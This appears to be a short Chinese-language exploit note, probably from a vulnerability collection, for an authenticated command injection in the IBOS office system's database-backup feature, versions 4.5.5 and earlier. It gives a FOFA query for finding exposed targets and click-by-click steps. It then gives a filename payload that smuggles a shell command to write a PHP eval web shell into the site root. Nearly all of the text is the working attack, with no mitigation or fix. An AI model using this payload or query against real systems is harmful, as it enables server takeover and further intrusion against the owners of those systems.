# IBOS酷办公系统 后台命令执行

FOFA：

```
body="IBOS" && body="login-panel"
```

利用条件

* IBOS_4.5.5及以前的版本
* 需要具备后台登陆权限

**PoC：**

登录之后点击管理后台。

在后台管理中找到通用设置，在数据库的备份中选择更多选项，数据备份方式选择系统 MySQL Dump (Shell) 备份，然后提交。

拦截此数据包，修改其中的filename参数,会在根目录生成2021.php  

```
2021%26echo "<?php eval($_REQUEST[8]);?>">2021%PATHEXT:~0,1%php%262021
```

via：xzuser@https://xz.aliyun.com/t/9115